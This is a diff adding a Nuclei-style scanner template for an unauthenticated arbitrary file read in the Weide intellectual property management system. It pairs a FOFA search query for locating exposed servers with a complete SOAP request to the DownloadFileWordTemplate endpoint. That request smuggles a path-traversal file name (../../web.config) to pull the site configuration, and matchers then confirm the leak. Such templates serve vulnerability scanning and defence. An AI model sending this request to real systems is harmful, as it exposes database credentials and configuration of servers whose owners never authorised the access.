@@ -1,0 +1,45 @@
+id: weide-DownloadFileWordTemplate-File-reading
+
+info:
+  tags: weide-DownloadFileWordTemplate-File-reading
+  name: 唯徳知识产权管理系统 DownloadFileWordTemplate 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="JSCOMM/language.js"
+    唯徳知识产权管理系统 DownloadFileWordTemplate 接口存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+
+http:
+  - raw:
+      - |
+        POST /AutoUpdate/WSFM.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DownloadFileWordTemplate xmlns="http://tempuri.org/">
+              <fileName>../../web.config</fileName>
+            </DownloadFileWordTemplate>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD94bWwg'
+          - '<?xml version="1.0"'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
